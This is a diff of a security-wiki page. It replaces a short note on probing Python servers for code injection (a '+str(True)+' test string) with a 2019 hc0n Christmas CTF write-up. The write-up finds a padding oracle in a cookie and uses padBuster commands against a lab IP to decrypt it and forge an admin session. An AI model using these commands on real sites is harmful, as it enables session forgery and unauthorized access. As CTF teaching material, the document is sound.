@@ -1,4 +1,4 @@
-# Python
+# hc0n Christmas CTF - 2019
 
 <details>
 
@@ -16,27 +16,43 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 
 </details>
 
-## Server using python
+![](../../.gitbook/assets/41d0cdc8d99a8a3de2758ccbdf637a21.jpeg)
 
-test a possible **code execution**, using the function _str()_:
+## Enumeration
 
-```python
-"+str(True)+" #If the string True is printed, then it is vulnerable
+I started **enumerating the machine using my tool** [**Legion**](https://github.com/carlospolop/legion):
+
+![](<../../.gitbook/assets/image (244).png>)
+
+There are 2 ports open: 80 (**HTTP**) and 22 (**SSH**)
+
+In the web page you can **register new users**, and I noticed that **the length of the cookie depends on the length of the username** indicated:
+
+![](<../../.gitbook/assets/image (245).png>)
+
+![](<../../.gitbook/assets/image (246).png>)
+
+And if you change some **byte** of the **cookie** you get this error:
+
+![](<../../.gitbook/assets/image (247).png>)
+
+With this information and[ **reading the padding oracle vulnerability**](../../cryptography/padding-oracle-priv.md) I was able to exploit it:
+
+```bash
+perl ./padBuster.pl http://10.10.231.5/index.php "GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" 8 -encoding 0 -cookies "hcon=GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy"
 ```
 
-### Tricks
+![](<../../.gitbook/assets/image (248).png>)
 
-{% content-ref url="../../misc/basic-python/bypass-python-sandboxes/" %}
-[bypass-python-sandboxes](../../misc/basic-python/bypass-python-sandboxes/)
-{% endcontent-ref %}
+![](<../../.gitbook/assets/image (249).png>)
 
-{% content-ref url="../../pentesting-web/ssti-server-side-template-injection/" %}
-[ssti-server-side-template-injection](../../pentesting-web/ssti-server-side-template-injection/)
-{% endcontent-ref %}
+**Set user admin:**
 
-{% content-ref url="../../pentesting-web/deserialization/" %}
-[deserialization](../../pentesting-web/deserialization/)
-{% endcontent-ref %}
+```bash
+perl ./padBuster.pl http://10.10.231.5/index.php "GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" 8 -encoding 0 -cookies "hcon=GVrfxWD0mmxRM0RPLht/oUpybgnBn/Oy" -plaintext "user=admin"
+```
+
+![](<../../.gitbook/assets/image (250).png>)
 
 <details>
 
